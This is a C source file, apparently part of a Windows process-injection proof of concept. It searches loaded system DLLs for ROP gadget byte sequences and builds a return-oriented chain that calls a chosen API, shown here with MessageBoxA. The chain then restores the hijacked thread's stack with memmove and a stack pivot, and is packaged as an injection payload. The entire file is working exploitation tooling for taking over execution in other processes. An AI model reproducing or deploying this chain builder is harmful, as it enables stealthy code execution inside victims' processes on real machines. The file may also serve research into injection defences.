#include <stdio.h>
#include "rop_chain.h"
#include "memmem.h"

#define check_Gadget(gadget, name) if (gadget == NULL) printf("\n[+] %s gadget returned null\n\n", name);
#define DONT_CARE 0

DWORD64 gadget_loop = 0;
DWORD64 gadget_popregs = 0;
DWORD64 gadget_ret = 0;
DWORD64	gadget_pivot = 0;
DWORD64	gadget_addrsp = 0;
DWORD64 gadget_poprax = 0;
DWORD64 gadget_poprdx = 0;
DWORD64 gadget_poprcx = 0;
DWORD64 gadget_popr8 = 0;
DWORD64 gadget_movsxd = 0;

DWORD64* rop_chain;
int rop_pos;
DWORD64 saved_return_address;
TStrDWORD64Map* run_params;

void SetRcx(DWORD64 value)
{
	rop_chain[rop_pos++] = gadget_poprcx;
	rop_chain[rop_pos++] = value;
}

void SetRdx(DWORD64 value)
{
	rop_chain[rop_pos++] = gadget_poprdx;
	rop_chain[rop_pos++] = value;
}

void SetR8(DWORD64 value)
{
	rop_chain[rop_pos++] = gadget_popr8;
	rop_chain[rop_pos++] = value;
}

void SetR9(DWORD64 value)
{
	rop_chain[rop_pos++] = gadget_poprax;
	rop_chain[rop_pos++] = value;
	rop_chain[rop_pos++] = gadget_movsxd;
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // skipped by gadget_addrsp
}

void SetApi(DWORD64 winapi)
{
	rop_chain[rop_pos++] = winapi;
	rop_chain[rop_pos++] = gadget_addrsp;
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // shadow space
	rop_chain[rop_pos++] = DONT_CARE; // skipped by gadget_addrsp
}

void FunctionCall(DWORD64 api_func, DWORD64 rcx, DWORD64 rdx, DWORD64 r8, DWORD64 r9)
{
	SetRcx(rcx);
	SetRdx(rdx);
	SetR8(r8);
	SetR9(r9);
	SetApi(api_func);
}

PIMAGE_SECTION_HEADER GetTextSection(HMODULE h_module)
{
	PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)h_module;
	PIMAGE_NT_HEADERS p_nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)p_dos_header + p_dos_header->e_lfanew);
	PIMAGE_SECTION_HEADER p_section_header = IMAGE_FIRST_SECTION(p_nt_headers);

	for (int i = 0; i < p_nt_headers->FileHeader.NumberOfSections; ++i)
	{
		if (p_section_header->SizeOfRawData != 0)
		{
			if (!memcmp(p_section_header->Name, ".text", 5))
			{
				return p_section_header;
			}
		}

		p_section_header++;
	}

	return 0;
}

DWORD64 GadgetFinder(const void* const needle, const size_t needle_len)
{
	// Searches a given gadget in the text sections of shared libraries.
	// Text section is the only one which is executable.

	DWORD64 gadget;
	CHAR modules[6][11] = { "ntdll", "kernel32", "user32", "kernelbase", "gdi32", "gdiPlus" };

	for (int i = 0; i < 6; ++i)
	{
		HMODULE h_module = GetModuleHandleA(modules[i]);
		if (h_module != NULL)
		{
			PIMAGE_SECTION_HEADER text_section = GetTextSection(h_module);
			DWORD64 text_section_address = (DWORD64)h_module + text_section->VirtualAddress;
			size_t text_section_size = text_section->SizeOfRawData;
			gadget = (DWORD64)memmem((BYTE*)text_section_address, text_section_size, needle, needle_len);
			if (gadget)
				return gadget;
		}
	}
	return 0;
}

BOOL FindGadgets()
{
	// jmp -2
	gadget_loop = GadgetFinder("\xEB\xFE", 2);
	check_Gadget(gadget_loop, "gadget_loop");
	if (gadget_loop == 0) return FALSE;

	// pop rax; pop rdx; pop rcx; pop r8; pop r9; pop r10; pop r11; ret
	gadget_popregs = GadgetFinder("\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
	check_Gadget(gadget_popregs, "gadget_popregs");
	if (gadget_popregs == 0) return FALSE;

	// ret;
	gadget_ret = GadgetFinder("\xC3", 1);
	check_Gadget(gadget_ret, "gadget_ret");
	if (gadget_ret == 0) return FALSE;

	// pop rsp; ret
	gadget_pivot = GadgetFinder("\x5C\xC3", 2);
	check_Gadget(gadget_pivot, "gadget_pivot");
	if (gadget_pivot == 0) return FALSE;

	// add rsp, 0x28; ret
	gadget_addrsp = GadgetFinder("\x48\x83\xC4\x28\xC3", 5);
	check_Gadget(gadget_addrsp, "gadget_addrsp");
	if (gadget_addrsp == 0) return FALSE;

	// pop rax; ret;
	gadget_poprax = GadgetFinder("\x58\xC3", 2);
	check_Gadget(gadget_poprax, "gadget_poprax");
	if (gadget_poprax == 0) return FALSE;

	// pop rdx; ret;
	gadget_poprdx = GadgetFinder("\x5A\xC3", 2);
	check_Gadget(gadget_poprdx, "gadget_poprdx");
	if (gadget_poprdx == 0) return FALSE;

	// pop rcx; ret;
	gadget_poprcx = GadgetFinder("\x59\xC3", 2);
	check_Gadget(gadget_poprcx, "gadget_poprcx");
	if (gadget_poprcx == 0) return FALSE;

	// pop r8; ret;
	gadget_popr8 = GadgetFinder("\x41\x58\xC3", 3);
	check_Gadget(gadget_popr8, "gadget_popr8");
	if (gadget_popr8 == 0) return FALSE;

	// movsxd r9, eax; mov rax, r9; add rsp 0x28; ret
	gadget_movsxd = GadgetFinder("\x4C\x63\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11);
	check_Gadget(gadget_movsxd, "gadget_movsxd");
	if (gadget_movsxd == 0) return FALSE;

	return TRUE;
}

PINJECT_PACKET* BuildPayload(TStrDWORD64Map& params) {
	LoadLibraryA("gdi32.dll");

	rop_pos = 0x0;
	run_params = &params;

	PINJECT_PACKET* output = (PINJECT_PACKET*)malloc(sizeof(PINJECT_PACKET) * 1);

	HMODULE h_ntdll = GetModuleHandleA("ntdll");
	if (h_ntdll == 0) return nullptr;

	if (!FindGadgets()) return nullptr;

	rop_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));

	if ((params["tos"] + 10 * sizeof(DWORD64)) & 0xf)
		rop_chain[rop_pos++] = gadget_ret;

	FunctionCall((DWORD64)MessageBoxA, 0, 0, 0, 0);


	SetRcx((*run_params)["orig_tos"]);

	rop_chain[rop_pos++] = gadget_poprdx;
	saved_return_address = rop_pos++;  // rdx

	SetR8(8);
	SetR9(DONT_CARE);
	SetApi((DWORD64)GetProcAddress(h_ntdll, "memmove"));

	rop_chain[rop_pos++] = gadget_pivot;
	rop_chain[rop_pos++] = (*run_params)["orig_tos"];

	rop_chain[saved_return_address] = (*run_params)["tos"] + sizeof(DWORD64) * rop_pos;
	rop_chain[rop_pos++] = DONT_CARE;

	for (int i = 0; i < rop_pos; ++i)
		printf("%2d --> 0x%llx\n", i, rop_chain[i]);

	params["saved_return_address"] = saved_return_address;
	params["gadget_pivot"] = gadget_pivot;
	params["rop_pos"] = rop_pos;

	output->buffer = rop_chain;
	output->buffer_size = 100 * sizeof(DWORD64);
	output->metadata = &params;

	return output;
}